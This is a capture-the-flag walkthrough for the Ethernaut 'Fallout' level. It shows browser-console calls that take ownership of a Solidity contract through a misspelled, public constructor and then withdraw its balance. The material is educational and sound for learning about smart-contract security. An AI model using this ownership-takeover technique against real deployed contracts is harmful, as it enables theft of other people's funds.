# Fallout

## Objective

Exploit a smart contract with a misnamed constructor to become the owner and (optionally) withdraw its balance.

---

## Getting Started

1. Go to [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com/)
2. Select the **"Fallout"** level
3. Click **“Get new instance”** and approve the transaction in MetaMask
4. The instance is now deployed and available as the `contract` object in the browser console
5. Save the instance address:

    ```js
    contract.address
    ```

---

## Walkthrough

### Step 1: Check the Current Owner

```js
await contract.owner()
```

**Explanation:**
This checks the current owner of the contract. Initially, it is likely uninitialized or set to the zero address due to the constructor typo.

---

### Step 2: Call the Misnamed Constructor

```js
await contract.Fal1out({ value: "1" })
```

**Explanation:**
The constructor was misspelled as `Fal1out`, making it a public function. Calling it allows you to become the contract owner.

---

### Step 3: Confirm Ownership

```js
await contract.owner()
```

**Explanation:**
Verifies that you are now the owner after calling the misnamed constructor.

---

### Step 4: (Optional) Withdraw Allocations

```js
await contract.collectAllocations()
```

**Explanation:**
If the contract holds ETH, only the owner can withdraw it using this function.

---

### Step 5: Submit the Level

Submit the instance in the Ethernaut UI and confirm the transaction in MetaMask to complete the level.

---

## What You Learn

This level teaches the following:

* The importance of correct constructor naming in Solidity versions before 0.7.0
* How typos in function names can introduce critical vulnerabilities
* How to exploit public functions to claim contract ownership
* The evolution to the `constructor` keyword in newer Solidity versions

---

## Resources Used

* [Ethernaut Game](https://ethernaut.openzeppelin.com/)
* [Solidity Docs](https://docs.soliditylang.org/)
* [YouTube Walkthrough](https://www.youtube.com/watch?v=1E0BTVudurM)
* [Blog Writeup](https://shubhamm.me/blog/09q-ethernaut-challenges-fallout)

---
